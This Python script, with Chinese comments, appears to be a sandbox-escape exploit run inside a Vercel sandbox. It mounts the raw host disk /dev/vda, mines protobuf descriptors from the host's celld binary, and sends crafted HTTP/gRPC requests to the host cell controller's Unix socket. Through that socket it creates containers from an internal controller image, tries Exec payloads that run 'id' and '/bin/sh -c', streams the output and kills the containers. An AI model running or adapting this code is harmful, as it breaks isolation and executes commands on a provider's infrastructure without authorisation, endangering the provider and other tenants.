# -*- coding: utf-8 -*-
"""vda23_descriptor: 挖 gzip protobuf descriptor + gRPC Exec 字段诊断 + 极速链路
P0: 扫描 celld 二进制 gzip blob -> 解压 -> 找 ExecRequest/CreateRequest/StartRequest 字段定义
P1: gRPC Exec 字段诊断 (field1 only / field2 变体)
P2: 极速链路 Create->Start->Exec(gRPC) 拿 processId
P3: Process StreamOutput (gRPC) 拿命令输出
输出落盘 + 哨兵 V23J_DONE"""
import os, time, socket, ctypes, re, struct, gzip

OUT = '/vercel/sandbox/v23j.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_raw(sockpath, path, body, ctype, t=6, shutdown_wr=False, te=None, chunked=False):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if isinstance(body, str):
            body = body.encode()
        hdr = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n' % (path, ctype))
        if chunked:
            hdr += 'Transfer-Encoding: chunked\r\n'
        else:
            hdr += 'Content-Length: %d\r\n' % len(body)
        hdr += 'Connection: close\r\n'
        if te:
            hdr += 'TE: %s\r\n' % te
        hdr += '\r\n'
        wire = body
        if chunked:
            wire = ('%x\r\n' % len(body)).encode() + body + b'\r\n0\r\n\r\n'
        s.sendall(hdr.encode() + wire)
        if shutdown_wr:
            try:
                s.shutdown(socket.SHUT_WR)
            except Exception:
                pass
        data = b''
        while True:
            try:
                chunk = s.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:1500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def grpc_env(payload):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def pbool(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    out.append(1 if v else 0)
    return bytes(out)


def pvarint(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    while v > 127:
        out.append((v & 127) | 128)
        v >>= 7
    out.append(v)
    return bytes(out)


def mine_descriptors(data):
    """扫描 gzip blob, 解压, 找消息定义"""
    found = []
    idx = 0
    while True:
        i = data.find(b'\x1f\x8b\x08', idx)
        if i < 0:
            break
        idx = i + 3
        if i > 0 and data[i - 1] == 0x08:
            continue
        try:
            dec = gzip.decompress(data[i:i + 400000])
        except Exception:
            continue
        txt = dec.decode('utf-8', errors='replace')
        if 'ExecRequest' in txt or 'CreateRequest' in txt or 'StreamOutputRequest' in txt:
            found.append((i, len(dec), txt[:200]))
        if len(found) > 12:
            break
    return found


def parse_msg_def(txt, msgname):
    """从 descriptor 文本中提取消息定义"""
    out = []
    for m in re.finditer(r'name:"%s"' % msgname, txt):
        seg = txt[m.start():m.start() + 3000]
        # field: name:"xxx" number:N label:L type:T
        fields = re.findall(r'name:"([a-z_0-9]+)" number:([0-9]+) label:LABEL_OPTIONAL type:TYPE_([A-Z_]+)', seg)
        out.append(fields)
        if len(out) >= 3:
            break
    return out


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CSVC = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # P0: 挖 descriptor
    log('=== P0 gzip descriptors ===')
    try:
        data = open('/mnt/vdax/opt/vercel/celld', 'rb').read()
        hits = mine_descriptors(data)
        log('gzip hits: %d' % len(hits))
        if hits:
            i, ln, txt = hits[0]
            log('first blob off=%d size=%d' % (i, ln))
            for msg in ['ExecRequest', 'CreateRequest', 'StartRequest', 'StreamOutputRequest', 'Process']:
                defs = parse_msg_def(txt, msg)
                log('%s defs: %s' % (msg, defs[:2]))
    except Exception as e:
        log('P0 ERR %s' % e)

    # P1: gRPC Exec 字段诊断
    log('=== P1 gRPC Exec field diag ===')
    st, bd = rpc_raw(sp, CSVC + '/Create', '{"image":"%s","command":"/bin/sleep 300"}' % IMG,
                     'application/json', t=30)
    log('create -> %s | %s' % (st, bd[:200]))
    m = re.search(r'"containerId":\s*"([^"]+)"', bd)
    if not m:
        log('NO CID - abort')
        log('V23J_DONE')
        f.close()
        return
    cid = m.group(1)
    log('CID=%s' % cid)
    st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % cid, 'application/json', t=8)
    log('start -> %s | %s' % (st, bd[:150]))

    # 立即诊断: field 变体
    variants = [
        ('f1-only', pstr(1, cid)),
        ('f1+f2-str-id', pstr(1, cid) + pstr(2, 'id')),
        ('f1+f3-str-id', pstr(1, cid) + pstr(3, 'id')),
        ('f1+f2-msg-argv1', pstr(1, cid) + pstr(2, pstr(1, 'id'))),
        ('f1+f2-msg-argv2', pstr(1, cid) + pstr(2, pstr(2, 'id'))),
        ('f1+f2-msg-path', pstr(1, cid) + pstr(2, pstr(1, '/bin/sh') + pstr(2, '/bin/sh') + pstr(3, '-c'))),
    ]
    for tag, payload in variants:
        st, bd = rpc_raw(sp, CSVC + '/Exec', grpc_env(payload), 'application/grpc', t=6, shutdown_wr=True, te='trailers')
        log('exec %-18s -> %s | %s' % (tag, st, bd[:250].replace('\n', ' ')))
        time.sleep(0.2)

    # P2: 极速链路 - 新容器
    log('=== P2 fast chain ===')
    st, bd = rpc_raw(sp, CSVC + '/Create', '{"image":"%s","command":"/bin/sleep 300"}' % IMG,
                     'application/json', t=30)
    m = re.search(r'"containerId":\s*"([^"]+)"', bd)
    if not m:
        log('NO CID2 - abort')
        log('V23J_DONE')
        f.close()
        return
    cid2 = m.group(1)
    log('CID2=%s' % cid2)
    st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % cid2, 'application/json', t=8)
    log('start -> %s | %s' % (st, bd[:150]))
    pid = None
    for tag, payload in [
        ('f1+f2-msg-argv1', pstr(1, cid2) + pstr(2, pstr(1, 'id'))),
        ('f1+f2-msg-argv2', pstr(1, cid2) + pstr(2, pstr(2, 'id'))),
        ('f1+f2-msg-cmd', pstr(1, cid2) + pstr(2, pstr(1, 'id') + pstr(2, 'id'))),
        ('f1-only', pstr(1, cid2)),
    ]:
        st, bd = rpc_raw(sp, CSVC + '/Exec', grpc_env(payload), 'application/grpc', t=8, shutdown_wr=True, te='trailers')
        log('exec %-18s -> %s | %s' % (tag, st, bd[:400].replace('\n', ' ')))
        mm = re.search(r'"(?:processId|process_id)":\s*"([^"]+)"', bd)
        if mm:
            pid = mm.group(1)
            log('PID=%s' % pid)
            break
        time.sleep(0.2)

    # P3: Process StreamOutput (gRPC)
    log('=== P3 Process StreamOutput ===')
    if pid:
        for tag, payload in [
            ('stdout', pstr(1, pid) + pbool(2, True)),
            ('noflag', pstr(1, pid)),
        ]:
            st, bd = rpc_raw(sp, PSVC + '/StreamOutput', grpc_env(payload), 'application/grpc', t=6, shutdown_wr=True, te='trailers')
            log('stream %s -> %s | %s' % (tag, st, bd[:500].replace('\n', ' ')))
            time.sleep(0.3)
    else:
        pid27 = 'hvcp_' + 'a' * 27
        st, bd = rpc_raw(sp, PSVC + '/StreamOutput', grpc_env(pstr(1, pid27) + pbool(2, True)),
                         'application/grpc', t=5, shutdown_wr=True, te='trailers')
        log('stream fake -> %s | %s' % (st, bd[:300].replace('\n', ' ')))

    # P4: Kill
    for cc in [cid, cid2]:
        st, bd = rpc_raw(sp, CSVC + '/Kill', '{"container_id":"%s"}' % cc, 'application/json', t=4)
        log('kill %s -> %s | %s' % (cc[:12], st, bd[:120]))

    log('V23J_DONE')
    f.close()


if __name__ == '__main__':
    main()
